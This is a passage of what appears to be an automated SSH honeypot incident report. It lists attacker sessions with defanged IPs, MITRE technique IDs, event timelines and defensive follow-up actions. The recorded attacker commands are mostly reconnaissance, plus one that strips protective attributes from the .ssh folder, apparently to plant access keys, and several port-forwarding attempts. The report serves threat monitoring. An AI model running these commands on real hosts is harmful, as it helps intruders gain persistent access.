| `2026-08-15 02:17:19` | `cowrie.session.params` |
| `2026-08-15 02:17:19` | `cowrie.command.input` |
| `2026-08-15 02:17:20` | `cowrie.log.closed` |
| `2026-08-15 02:17:21` | `cowrie.session.params` |
| `2026-08-15 02:17:21` | `cowrie.command.input` |
| `2026-08-15 02:17:23` | `cowrie.log.closed` |
| `2026-08-15 02:17:23` | `cowrie.session.params` |
| `2026-08-15 02:17:23` | `cowrie.command.input` |
| `2026-08-15 02:17:24` | `cowrie.log.closed` |
| `2026-08-15 02:17:25` | `cowrie.session.params` |
| `2026-08-15 02:17:25` | `cowrie.command.input` |
| `2026-08-15 02:17:25` | `cowrie.log.closed` |
| `2026-08-15 02:17:26` | `cowrie.session.params` |
| `2026-08-15 02:17:26` | `cowrie.command.input` |
| `2026-08-15 02:17:27` | `cowrie.log.closed` |
| `2026-08-15 02:17:27` | `cowrie.session.params` |
| `2026-08-15 02:17:27` | `cowrie.command.input` |
| `2026-08-15 02:17:28` | `cowrie.log.closed` |
| `2026-08-15 02:17:29` | `cowrie.session.params` |
| `2026-08-15 02:17:29` | `cowrie.command.input` |
| `2026-08-15 02:17:30` | `cowrie.log.closed` |
| `2026-08-15 02:17:31` | `cowrie.session.params` |
| `2026-08-15 02:17:31` | `cowrie.command.input` |
| `2026-08-15 02:17:31` | `cowrie.log.closed` |
| `2026-08-15 02:17:32` | `cowrie.session.params` |
| `2026-08-15 02:17:32` | `cowrie.command.input` |
| `2026-08-15 02:17:33` | `cowrie.log.closed` |
| `2026-08-15 02:17:33` | `cowrie.session.params` |
| `2026-08-15 02:17:33` | `cowrie.command.input` |
| `2026-08-15 02:17:34` | `cowrie.log.closed` |
| `2026-08-15 02:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1509fc336dd7

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 02:16 |
| **Last Seen** | 2026-08-15 02:21 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:16:52` | `cowrie.session.connect` |
| `2026-08-15 02:16:52` | `cowrie.client.version` |
| `2026-08-15 02:16:53` | `cowrie.client.kex` |
| `2026-08-15 02:16:54` | `cowrie.login.success` |
| `2026-08-15 02:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72e0cf39b4d2

| Field | Detail |
|---|---|
| **Source IP** | `103.171.39[.]147` |
| **First Seen** | 2026-08-15 02:18 |
| **Last Seen** | 2026-08-15 02:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:18:46` | `cowrie.session.connect` |
| `2026-08-15 02:18:47` | `cowrie.client.version` |
| `2026-08-15 02:18:47` | `cowrie.client.kex` |
| `2026-08-15 02:18:49` | `cowrie.login.success` |
| `2026-08-15 02:18:50` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3f9d7d6e83

| Field | Detail |
|---|---|
| **Source IP** | `222.186.68[.]153` |
| **First Seen** | 2026-08-15 02:18 |
| **Last Seen** | 2026-08-15 02:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:18:56` | `cowrie.session.connect` |
| `2026-08-15 02:18:57` | `cowrie.client.version` |
| `2026-08-15 02:18:57` | `cowrie.client.kex` |
| `2026-08-15 02:19:00` | `cowrie.login.success` |
| `2026-08-15 02:19:00` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.186.68[.]153` to AbuseIPDB if not already reported
- [ ] Block `222.186.68[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1e8f19b6447

| Field | Detail |
|---|---|
| **Source IP** | `34.79.100[.]31` |
| **First Seen** | 2026-08-15 02:22 |
| **Last Seen** | 2026-08-15 02:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:22:30` | `cowrie.session.connect` |
| `2026-08-15 02:22:30` | `cowrie.login.success` |
| `2026-08-15 02:22:30` | `cowrie.session.params` |
| `2026-08-15 02:22:30` | `cowrie.command.input` |
| `2026-08-15 02:22:30` | `cowrie.command.input` |
| `2026-08-15 02:22:30` | `cowrie.command.failed` |
| `2026-08-15 02:22:30` | `cowrie.command.input` |
| `2026-08-15 02:22:31` | `cowrie.log.closed` |
| `2026-08-15 02:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.100[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.79.100[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c5b4fe00df

| Field | Detail |
|---|---|
| **Source IP** | `34.79.100[.]31` |
| **First Seen** | 2026-08-15 02:22 |
| **Last Seen** | 2026-08-15 02:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:22:43` | `cowrie.session.connect` |
| `2026-08-15 02:22:43` | `cowrie.login.success` |
| `2026-08-15 02:22:44` | `cowrie.session.params` |
| `2026-08-15 02:22:44` | `cowrie.command.input` |
| `2026-08-15 02:22:44` | `cowrie.command.failed` |
| `2026-08-15 02:22:52` | `cowrie.log.closed` |
| `2026-08-15 02:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.100[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.79.100[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f794741a770

| Field | Detail |
|---|---|
| **Source IP** | `34.79.100[.]31` |
| **First Seen** | 2026-08-15 02:22 |
| **Last Seen** | 2026-08-15 02:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:22:45` | `cowrie.session.connect` |
| `2026-08-15 02:22:45` | `cowrie.login.success` |
| `2026-08-15 02:22:46` | `cowrie.session.params` |
| `2026-08-15 02:22:46` | `cowrie.command.input` |
| `2026-08-15 02:22:52` | `cowrie.log.closed` |
| `2026-08-15 02:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.100[.]31` to AbuseIPDB if not already reported
- [ ] Block `34.79.100[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c217f36639

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 02:23 |
| **Last Seen** | 2026-08-15 02:24 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:23:39` | `cowrie.session.connect` |
| `2026-08-15 02:23:43` | `cowrie.client.version` |
| `2026-08-15 02:23:43` | `cowrie.client.kex` |
| `2026-08-15 02:24:07` | `cowrie.login.success` |
| `2026-08-15 02:24:18` | `cowrie.session.params` |
| `2026-08-15 02:24:18` | `cowrie.command.input` |
| `2026-08-15 02:24:25` | `cowrie.log.closed` |
| `2026-08-15 02:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbc602127f69

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 02:32 |
| **Last Seen** | 2026-08-15 02:37 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:32:17` | `cowrie.session.connect` |
| `2026-08-15 02:32:17` | `cowrie.client.version` |
| `2026-08-15 02:32:18` | `cowrie.client.kex` |
| `2026-08-15 02:32:19` | `cowrie.login.success` |
| `2026-08-15 02:32:19` | `cowrie.session.params` |
| `2026-08-15 02:32:19` | `cowrie.command.input` |
| `2026-08-15 02:32:19` | `cowrie.command.failed` |
| `2026-08-15 02:37:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fef361e2017

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 02:35 |
| **Last Seen** | 2026-08-15 02:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:35:10` | `cowrie.session.connect` |
| `2026-08-15 02:35:10` | `cowrie.client.version` |
| `2026-08-15 02:35:10` | `cowrie.client.kex` |
| `2026-08-15 02:35:11` | `cowrie.login.success` |
| `2026-08-15 02:35:12` | `cowrie.session.params` |
| `2026-08-15 02:35:12` | `cowrie.command.input` |
| `2026-08-15 02:35:12` | `cowrie.log.closed` |
| `2026-08-15 02:35:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1ce501608b4

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 02:36 |
| **Last Seen** | 2026-08-15 02:41 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:36:03` | `cowrie.session.connect` |
| `2026-08-15 02:36:03` | `cowrie.client.version` |
| `2026-08-15 02:36:04` | `cowrie.client.kex` |
| `2026-08-15 02:36:04` | `cowrie.login.success` |
| `2026-08-15 02:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c12f3eb3e0b4

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-15 02:36 |
| **Last Seen** | 2026-08-15 02:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:36:36` | `cowrie.session.connect` |
| `2026-08-15 02:36:36` | `cowrie.client.version` |
| `2026-08-15 02:36:36` | `cowrie.client.kex` |
| `2026-08-15 02:36:38` | `cowrie.login.success` |
| `2026-08-15 02:36:39` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cceb8f14f4e7

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-08-15 02:36 |
| **Last Seen** | 2026-08-15 02:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:36:45` | `cowrie.session.connect` |
| `2026-08-15 02:36:46` | `cowrie.client.version` |
| `2026-08-15 02:36:46` | `cowrie.client.kex` |
| `2026-08-15 02:36:48` | `cowrie.login.success` |
| `2026-08-15 02:36:48` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcfb115dbedf

| Field | Detail |
|---|---|
| **Source IP** | `41.45.177[.]186` |
| **First Seen** | 2026-08-15 02:36 |
| **Last Seen** | 2026-08-15 02:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:36:55` | `cowrie.session.connect` |
| `2026-08-15 02:36:56` | `cowrie.client.version` |
| `2026-08-15 02:36:56` | `cowrie.client.kex` |
| `2026-08-15 02:36:57` | `cowrie.login.success` |
| `2026-08-15 02:36:58` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.45.177[.]186` to AbuseIPDB if not already reported
- [ ] Block `41.45.177[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a72bec66eb0

| Field | Detail |
|---|---|
| **Source IP** | `85.30.248[.]213` |
| **First Seen** | 2026-08-15 02:42 |
| **Last Seen** | 2026-08-15 02:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:42:04` | `cowrie.session.connect` |
| `2026-08-15 02:42:05` | `cowrie.client.version` |
| `2026-08-15 02:42:05` | `cowrie.client.kex` |
| `2026-08-15 02:42:06` | `cowrie.login.success` |
| `2026-08-15 02:42:07` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.30.248[.]213` to AbuseIPDB if not already reported
- [ ] Block `85.30.248[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c658d18b7352

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]55` |
| **First Seen** | 2026-08-15 02:42 |
| **Last Seen** | 2026-08-15 02:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:42:12` | `cowrie.session.connect` |
| `2026-08-15 02:42:12` | `cowrie.client.version` |
| `2026-08-15 02:42:12` | `cowrie.client.kex` |
| `2026-08-15 02:42:14` | `cowrie.login.success` |
| `2026-08-15 02:42:14` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]55` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3843ac8b7f8d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 02:43 |
| **Last Seen** | 2026-08-15 02:48 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:43:33` | `cowrie.session.connect` |
| `2026-08-15 02:43:33` | `cowrie.client.version` |
| `2026-08-15 02:43:34` | `cowrie.client.kex` |
| `2026-08-15 02:43:34` | `cowrie.login.success` |
| `2026-08-15 02:48:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-100c11004f48

| Field | Detail |
|---|---|
| **Source IP** | `222.139.245[.]137` |
| **First Seen** | 2026-08-15 02:43 |
| **Last Seen** | 2026-08-15 02:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:43:58` | `cowrie.session.connect` |
| `2026-08-15 02:43:59` | `cowrie.client.version` |
| `2026-08-15 02:43:59` | `cowrie.client.kex` |
| `2026-08-15 02:44:01` | `cowrie.login.success` |
| `2026-08-15 02:44:02` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.139.245[.]137` to AbuseIPDB if not already reported
- [ ] Block `222.139.245[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a108e182fba

| Field | Detail |
|---|---|
| **Source IP** | `222.174.184[.]86` |
| **First Seen** | 2026-08-15 02:44 |
| **Last Seen** | 2026-08-15 02:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:44:08` | `cowrie.session.connect` |
| `2026-08-15 02:44:09` | `cowrie.client.version` |
| `2026-08-15 02:44:09` | `cowrie.client.kex` |
| `2026-08-15 02:44:12` | `cowrie.login.success` |
| `2026-08-15 02:44:12` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.174.184[.]86` to AbuseIPDB if not already reported
- [ ] Block `222.174.184[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abac49b97cc5

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-08-15 02:44 |
| **Last Seen** | 2026-08-15 02:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:44:15` | `cowrie.session.connect` |
| `2026-08-15 02:44:15` | `cowrie.client.version` |
| `2026-08-15 02:44:15` | `cowrie.client.kex` |
| `2026-08-15 02:44:18` | `cowrie.login.success` |
| `2026-08-15 02:44:19` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e3c1abc326

| Field | Detail |
|---|---|
| **Source IP** | `116.228.195[.]251` |
| **First Seen** | 2026-08-15 02:44 |
| **Last Seen** | 2026-08-15 02:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:44:24` | `cowrie.session.connect` |
| `2026-08-15 02:44:25` | `cowrie.client.version` |
| `2026-08-15 02:44:25` | `cowrie.client.kex` |
| `2026-08-15 02:44:27` | `cowrie.login.success` |
| `2026-08-15 02:44:28` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.195[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.228.195[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-930fb09b7638

| Field | Detail |
|---|---|
| **Source IP** | `34.79.38[.]96` |
| **First Seen** | 2026-08-15 02:46 |
| **Last Seen** | 2026-08-15 02:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:46:04` | `cowrie.session.connect` |
| `2026-08-15 02:46:04` | `cowrie.login.success` |
| `2026-08-15 02:46:05` | `cowrie.session.params` |
| `2026-08-15 02:46:05` | `cowrie.command.input` |
| `2026-08-15 02:46:05` | `cowrie.command.input` |
| `2026-08-15 02:46:05` | `cowrie.command.failed` |
| `2026-08-15 02:46:05` | `cowrie.command.input` |
| `2026-08-15 02:46:05` | `cowrie.log.closed` |
| `2026-08-15 02:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.38[.]96` to AbuseIPDB if not already reported
- [ ] Block `34.79.38[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b448c596a20f

| Field | Detail |
|---|---|
| **Source IP** | `34.79.38[.]96` |
| **First Seen** | 2026-08-15 02:46 |
| **Last Seen** | 2026-08-15 02:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:46:18` | `cowrie.session.connect` |
| `2026-08-15 02:46:18` | `cowrie.login.success` |
| `2026-08-15 02:46:18` | `cowrie.session.params` |
| `2026-08-15 02:46:18` | `cowrie.command.input` |
| `2026-08-15 02:46:18` | `cowrie.command.failed` |
| `2026-08-15 02:46:27` | `cowrie.log.closed` |
| `2026-08-15 02:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.38[.]96` to AbuseIPDB if not already reported
- [ ] Block `34.79.38[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c41453c0a3

| Field | Detail |
|---|---|
| **Source IP** | `34.79.38[.]96` |
| **First Seen** | 2026-08-15 02:46 |
| **Last Seen** | 2026-08-15 02:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:46:20` | `cowrie.session.connect` |
| `2026-08-15 02:46:20` | `cowrie.login.success` |
| `2026-08-15 02:46:20` | `cowrie.session.params` |
| `2026-08-15 02:46:20` | `cowrie.command.input` |
| `2026-08-15 02:46:27` | `cowrie.log.closed` |
| `2026-08-15 02:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.38[.]96` to AbuseIPDB if not already reported
- [ ] Block `34.79.38[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fba53663b7d

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 02:46 |
| **Last Seen** | 2026-08-15 02:47 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:46:29` | `cowrie.session.connect` |
| `2026-08-15 02:46:33` | `cowrie.client.version` |
| `2026-08-15 02:46:33` | `cowrie.client.kex` |
| `2026-08-15 02:46:57` | `cowrie.login.success` |
| `2026-08-15 02:47:08` | `cowrie.session.params` |
| `2026-08-15 02:47:08` | `cowrie.command.input` |
| `2026-08-15 02:47:15` | `cowrie.log.closed` |
| `2026-08-15 02:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6a892f451d6

| Field | Detail |
|---|---|
| **Source IP** | `106.89.59[.]63` |
| **First Seen** | 2026-08-15 02:52 |
| **Last Seen** | 2026-08-15 02:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:52:37` | `cowrie.session.connect` |
| `2026-08-15 02:52:38` | `cowrie.client.version` |
| `2026-08-15 02:52:38` | `cowrie.client.kex` |
